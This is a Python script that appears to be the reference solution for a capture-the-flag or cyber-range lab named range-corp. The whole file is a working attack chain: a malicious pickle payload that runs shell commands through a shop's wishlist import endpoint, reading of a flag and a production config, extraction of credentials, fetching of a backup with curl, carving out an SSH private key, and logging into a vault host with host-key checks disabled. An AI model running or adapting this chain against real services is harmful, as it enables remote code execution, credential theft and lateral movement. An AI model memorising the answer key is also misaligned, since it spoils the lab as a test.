#!/usr/bin/env python3
"""Oracle for range-corp: pickle RCE -> flag1+creds -> cfg bundle -> ssh vault."""

import base64
import json
import pickle
import re
import urllib.request

SHOP = "http://shop:8080"


def rce(cmd: str) -> str:
    class Payload:
        def __reduce__(self):  # executed by the shop on unpickling
            return (eval, (f"__import__('os').popen({cmd!r}).read()",))

    payload = pickle.dumps(Payload())
    data = json.dumps({"data": base64.b64encode(payload).decode()}).encode()
    req = urllib.request.Request(
        f"{SHOP}/api/wishlist/import", data=data, headers={"Content-Type": "application/json"}
    )
    with urllib.request.urlopen(req, timeout=60) as r:
        return r.read().decode(errors="replace")


print(rce("id; cat /home/app/flag1.txt; echo ---; cat /opt/cfg/prod.ini"))
creds = rce("cat /opt/cfg/prod.ini")
user = re.search(r"user = (\S+)", creds).group(1)
password = re.search(r"password = (\S+)", creds).group(1)
print(rce(f"curl -s -u {user}:{password} http://cfg/core/backup.env"))
chain = (
    f"curl -s -u {user}:{password} http://cfg/core/backup.env"
    " | sed -n '/-----BEGIN OPENSSH PRIVATE KEY-----/,/-----END OPENSSH PRIVATE KEY-----/p'"
    " > /tmp/k && chmod 600 /tmp/k"
    " && ssh -i /tmp/k -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null"
    " ops@vault 'cat /home/ops/flag3.txt' 2>/dev/null"
)
print(rce(chain))
